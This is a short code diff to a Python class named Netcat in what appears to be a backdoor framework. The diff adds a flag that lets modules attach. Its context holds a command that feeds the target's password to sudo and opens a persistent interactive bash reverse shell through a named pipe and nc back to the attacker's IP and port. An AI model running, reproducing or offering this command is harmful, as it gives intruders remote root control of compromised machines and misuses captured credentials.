@@ -11,6 +11,7 @@ class Netcat(Backdoor):
         self.options = {
                 "port"   : Option("port", 53920, "port to connect to", True),
                 }
+        self.allow_modules = True
         self.enabled_modules = {}
         self.modules = {} 
         self.command = "echo " + self.target.pword + " | sudo -S nohup cat /tmp/f | nohup /bin/bash -i 2>&1 | nohup nc " + self.core.localIP + " %s > sudo nohup /tmp/f &" % self.get_value("port")
